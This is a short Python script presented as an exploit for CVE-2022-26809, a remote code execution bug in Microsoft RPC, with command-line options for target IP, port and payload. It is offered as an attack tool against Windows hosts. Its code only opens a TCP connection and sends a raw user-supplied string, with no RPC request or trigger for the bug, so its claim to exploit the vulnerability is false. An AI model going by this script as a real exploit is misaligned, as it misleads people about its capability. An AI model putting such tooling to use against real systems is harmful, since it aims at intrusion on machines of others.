'''
CVE: 2022-26809
Tested on: Windows systems with vulnerable Microsoft RPC runtime
Description: This script exploits a remote code execution through a bug in the Microsoft Remote Procedure Call (RPC) communication protocol on specific version windows system.
'''

import sys
import socket
import argparse

# Usage Guidelines for the script
usage = "\n[!] Use cve-2022-26809.py -u target_ip -p port -c payload"
description = "[!] This script exploits a remote code execution vulnerability in Microsoft RPC runtime. Ensure the target system is vulnerable before running this script."

# Setting up the command-line argument parser
parser = argparse.ArgumentParser(usage=usage, description=description)
parser.add_argument("-u", dest="target", type=str, required=True, help="Specify the target IP address")
parser.add_argument("-p", dest="port", type=int, required=True, help="Specify the target port (default is 135)")
parser.add_argument("-c", dest="payload", type=str, required=True, help="Specify the payload to send to the target system")
args = parser.parse_args()

# Function to validate the target IP and port
def validate_target(target, port):
    try:
        print(f"[!] Validating target {target}:{port}...")
        with socket.create_connection((target, port), timeout=10) as sock:
            print(f"[+] Target {target}:{port} is reachable.")
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        print(f"[-] Unable to connect to {target}:{port}. Error: {e}")
        sys.exit()

# Function to construct and send the exploit payload
def send_exploit(target, port, payload):
    print("[!] Constructing exploit payload...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((target, port))
            print("[!] Sending exploit payload...")
            sock.sendall(payload.encode())  # Send the payload
            sock.settimeout(20)  
            try:
                response = sock.recv(1024)  # Receive the response
                if response:
                    print("[+] Response from target:")
                    print(response.decode(errors="ignore"))
                else:
                    print("[-] No response received from the target.")
            except socket.timeout:
                print("[-] No response received from the target (timeout).")
    except Exception as e:
        print(f"[-] Exploit failed. Error: {e}")
    finally:
        print("[!] Exploit process completed.")

# Main function to coordinate the exploitation process
def exploit(target, port, payload):
    validate_target(target, port)
    send_exploit(target, port, payload)

# Entry point
if __name__ == "__main__":
    target = args.target
    port = args.port
    payload = args.payload

    print(f"[!] Target: {target}")
    print(f"[!] Port: {port}")
    print(f"[!] Payload: {payload}")

    exploit(target, port, payload)